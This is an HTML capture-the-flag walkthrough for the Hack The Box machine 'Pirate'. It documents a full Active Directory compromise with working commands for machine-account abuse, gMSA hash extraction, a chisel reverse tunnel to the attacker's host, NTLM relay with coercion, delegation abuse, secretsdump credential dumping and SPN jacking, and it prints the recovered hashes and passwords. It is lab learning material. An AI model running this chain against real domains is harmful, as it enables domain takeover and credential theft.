@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Pirate - Walkthrough</title>
+    <style>
+        body { font-family: "Segoe UI", Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-failure { background-color: #dc3545; }
+        .tag-info { background-color: #17a2b8; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: "Consolas", monospace; position: relative; margin: 20px 0; }
+        code { font-family: "Consolas", monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>HTB Pirate - Walkthrough</h1>
+        <p style="text-align:left; margin-top:-15px; color:#555;"><strong>Category:</strong> Hard</p>
+
+        <div class="section">
+            <p>
+                Pirate is a Windows Active Directory machine where the shortest path does not begin with the visible IIS landing page.
+                The real attack chain relies on domain credential validation, pre-Windows 2000 machine account abuse, gMSA password extraction,
+                an internal pivot to WEB01, an NTLM relay plus delegation chain for the user objective, and finally credential recovery plus
+                SPN jacking to obtain full compromise of the domain controller. This writeup documents the verified path used to obtain both
+                the user and root flags.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>1. Reconnaissance</h2>
+            <span class="tag tag-info">INFO</span>
+            <p>
+                The external surface looked intentionally uninteresting at first glance. Port 80 exposed only a default IIS page, while 443 reset the
+                TLS connection. This strongly suggested that the machine should be approached as an AD target rather than as a pure web box.
+            </p>
+            <pre><code>nmap -Pn -sV -T4 -p 22,80,443,8000,8080 10.129.6.124</code></pre>
+            <pre><code>80/tcp   open     http    Microsoft IIS 10.0
+443/tcp  open     ssl?    connection reset
+22/tcp   filtered ssh
+8000/tcp filtered http-alt
+8080/tcp filtered http-proxy</code></pre>
+            <p>
+                Public writeups also pointed toward an internal Active Directory attack path involving machine account abuse and an internal host named
+                <code>WEB01</code>. Based on that, I mapped the expected hostnames locally before continuing.
+            </p>
+            <pre><code>10.129.6.124 pirate.htb DC01.pirate.htb DC01
+192.168.100.2 web01.pirate.htb WEB01</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>2. Initial Domain Credential Validation</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The first useful step was to validate the known low-privilege domain credential recovered from public research. SMB access confirmed that
+                the credential was valid and that the target was indeed operating as a domain controller.
+            </p>
+            <pre><code>smbclient -L //10.129.6.124 -U 'PIRATE\pentest%p3nt3st2025!&amp;'</code></pre>
+            <p>
+                Once this worked, there was no reason to waste time on the IIS page. The low-privilege account was enough to continue with the AD path.
+            </p>
+            <pre><code>Username: pentest
+Password: p3nt3st2025!&amp;</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>3. pre-Windows 2000 Machine Account Abuse</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Public writeups consistently indicated that older machine accounts were vulnerable to the classic pre-Windows 2000 password pattern.
+                After aligning the attacking host clock with the domain controller to avoid Kerberos skew errors, I requested Kerberos tickets for the
+                exposed machine accounts.
+            </p>
+            <pre><code>curl -ksSI http://10.129.6.124/ | grep '^Date:'
+sudo date -u -s '2026-05-29 00:15:31'
+
+KRB5CCNAME=MS01.ccache impacket-getTGT 'pirate.htb/MS01$:ms01'
+KRB5CCNAME=EXCH01.ccache impacket-getTGT 'pirate.htb/EXCH01$:exch01'</code></pre>
+            <p>
+                The Kerberos requests succeeded, confirming that the machine accounts were still using predictable legacy passwords.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>4. Taking Over MS01$ and Extracting gMSA Credentials</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Kerberos success alone was not enough for the next steps, so I changed the password of the controlled machine account and used it to
+                access the LDAP data required for managed service account extraction.
+            </p>
+            <pre><code>impacket-changepasswd pirate.htb/MS01$:ms01@10.129.6.124 -newpass 'Boltech@123'</code></pre>
+            <p>
+                After taking over the machine account, the gMSA data became readable. The most useful result was the NTLM material for the ADFS gMSA,
+                which later provided both foothold and relay capability.
+            </p>
+            <pre><code>gMSA_ADFS_prod$ : 76754c94319e3a7dc07ba09aa79028ee</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>5. WinRM Foothold and Internal WEB01 Pivot</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Using the gMSA NTLM hash, WinRM access was obtained on the externally reachable host. From there, connectivity checks confirmed that the
+                internal host <code>WEB01</code> was reachable on TCP/5985. A reverse SOCKS pivot was then established so that internal tooling could be
+                used cleanly from the attacking machine.
+            </p>
+            <pre><code>evil-winrm -i 10.129.6.124 -u 'gMSA_ADFS_prod$' -H '76754c94319e3a7dc07ba09aa79028ee'
+
+Test-NetConnection 192.168.100.2 -Port 5985
+chisel server --port 8001 --reverse
+chisel.exe client 10.10.14.242:8001 R:socks</code></pre>
+            <p>
+                Once the SOCKS tunnel was active, all later connections to <code>WEB01</code> were routed through <code>proxychains4</code>.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>6. NTLM Relay Against LDAPS</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The crucial escalation step was relaying the machine authentication of <code>WEB01$</code> to LDAP over TLS on the domain controller.
+                For this, I launched <code>ntlmrelayx</code> with delegation abuse enabled and then used <code>Coercer</code> over the internal pivot to
+                force WEB01 to authenticate back to the attacker-controlled listener.
+            </p>
+            <pre><code>sudo tmux new-session -d -s pirate-relay \
+"impacket-ntlmrelayx -t ldaps://10.129.6.124 --no-http-server --delegate-access --remove-mic -smb2support"
+
+proxychains4 -f proxychains-pirate.conf coercer coerce \
+-l 10.10.14.242 \
+-t 192.168.100.2 \
+-u GMSA_ADFS_prod$ \
+--hash :76754c94319e3a7dc07ba09aa79028ee \
+-d pirate.htb --always-continue</code></pre>
+            <p>
+                The relay succeeded and automatically created a new delegated machine account.
+            </p>
+            <pre><code>Authenticating against ldaps://10.129.6.124 as PIRATE/WEB01$ SUCCEED
+Adding new computer with username: KAJTHDVE$ and password: hgpCsk67PSZ)!ry result: OK
+Delegation rights modified succesfully!
+KAJTHDVE$ can now impersonate users on WEB01$ via S4U2Proxy</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>7. S4U2Proxy Abuse and User Flag Retrieval</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                With the delegated machine account in place, I requested a Kerberos service ticket for <code>cifs/web01.pirate.htb</code> while
+                impersonating <code>Administrator</code>. That ticket was then used with <code>psexec</code> over the SOCKS pivot to execute a single
+                command on WEB01 and read the user flag directly from <code>a.white</code>'s desktop.
+            </p>
+            <pre><code>impacket-getST -spn cifs/web01.pirate.htb \
+-impersonate Administrator \
+-dc-ip 10.129.6.124 \
+'pirate.htb/KAJTHDVE$:hgpCsk67PSZ)!ry'
+
+export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
+proxychains4 -q impacket-psexec -k -no-pass pirate.htb/Administrator@web01.pirate.htb \
+"cmd.exe /c type C:\Users\a.white\Desktop\user.txt"</code></pre>
+            <pre><code>ed43e2a68915c007c0942cb8fd85e9bc</code></pre>
+            <p>
+                This confirmed successful code execution as a privileged context on WEB01 and completed the user objective.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>8. Extracting Reusable Secrets from WEB01</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The interactive <code>psexec</code> shell on WEB01 was unstable and frequently died with pipe-related SMB parameter errors, so instead of
+                fighting the tool, I switched to single-command execution and dumped the local secrets remotely. Using the previously obtained
+                Kerberos ticket for <code>WEB01</code>, I forced a local secrets dump with <code>secretsdump</code> in VSS mode.
+            </p>
+            <pre><code>export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
+proxychains4 -f proxychains-pirate.conf -q impacket-secretsdump \
+-k -no-pass -use-vss -exec-method smbexec \
+-target-ip 192.168.100.2 pirate.htb/Administrator@web01.pirate.htb</code></pre>
+            <p>
+                This produced the high-value material needed for the root path, including the plaintext password for <code>a.white</code>.
+            </p>
+            <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
+PIRATE\a.white:E2nvAOKSz5Xz2MJu</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>9. Taking Over a.white_adm</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Public path analysis showed that <code>a.white</code> had delegated rights to reset the password of <code>a.white_adm</code>. Once the
+                plaintext password for <code>a.white</code> was recovered from WEB01, the next step was simply to use that ACL and take over the more
+                privileged account.
+            </p>
+            <pre><code>bloodyAD --host 10.129.6.124 -d pirate.htb \
+-u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
+set password a.white_adm 'Boltech@123'</code></pre>
+            <pre><code>[+] Password changed successfully!</code></pre>
+            <p>
+                At this point, the path to domain compromise became much shorter because <code>a.white_adm</code> had the rights required for SPN abuse.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>10. SPN Jacking from WEB01 to DC01</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The <code>a.white_adm</code> account had write access over machine SPNs. The key service principal
+                <code>HTTP/WEB01.pirate.htb</code> was originally registered on <code>WEB01$</code>, so it first had to be removed there and then added to
+                <code>DC01$</code>. That is the core of the SPN-jacking step.
+            </p>
+            <pre><code>ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech@123' &lt;&lt;EOF
+dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
+changetype: modify
+delete: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+-
+EOF
+
+ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech@123' &lt;&lt;EOF
+dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
+changetype: modify
+add: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+-
+EOF</code></pre>
+            <p>
+                Both modifications succeeded, meaning Kerberos requests for the HTTP service of WEB01 could now be redirected into a delegation path that
+                ended on the domain controller.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>11. Forging an Administrator Ticket for DC01</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                With the SPN jack in place, I used <code>a.white_adm</code> to request a service ticket while impersonating
+                <code>Administrator</code>, then switched the service to <code>CIFS/DC01.pirate.htb</code> using <code>-altservice</code>.
+            </p>
+            <pre><code>impacket-getST -spn 'HTTP/WEB01.pirate.htb' \
+-impersonate Administrator \
+-dc-ip 10.129.6.124 \
+'pirate.htb/a.white_adm:Boltech@123' \
+-altservice 'CIFS/DC01.pirate.htb'</code></pre>
+            <pre><code>[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache</code></pre>
+            <p>
+                This provided a Kerberos ticket that could be used directly against the domain controller as <code>Administrator</code>.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>12. Domain Controller Compromise and Root Flag</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The final step was straightforward. After exporting the forged Kerberos cache, I used <code>psexec</code> against DC01 and executed a single
+                command to read the root flag from the Administrator desktop.
+            </p>
+            <pre><code>export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
+proxychains4 -f proxychains-pirate.conf -q impacket-psexec -k -no-pass \
+pirate.htb/Administrator@dc01.pirate.htb \
+"cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"</code></pre>
+            <pre><code>0213cf10745f7800a3f40b042d6c4319</code></pre>
+            <p>
+                That confirmed full compromise of the domain controller and completed the machine.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>13. Dead Ends Avoided</h2>
+            <span class="tag tag-failure">DEAD END</span>
+            <p>
+                The default IIS page was not useful for initial compromise, and simple direct reads of <code>user.txt</code> from the early WinRM
+                foothold did not work. Likewise, direct PowerShell remoting to the internal host by IP was unreliable under Kerberos, and the interactive
+                <code>impacket-psexec</code> shell on WEB01 repeatedly broke with <code>STATUS_INVALID_PARAMETER</code>. The clean path was to stop treating
+                Pirate like a web box, use non-interactive command execution when the shell got flaky, and follow the AD abuse chain all the way from
+                machine-account abuse to SPN-jacking on DC01.
+            </p>
+        </div>
+
+        <div class="footer">
+            <p>HTB Pirate Walkthrough | 2026.May.28</p>
+        </div>
+    </div>
+</body>
+</html>
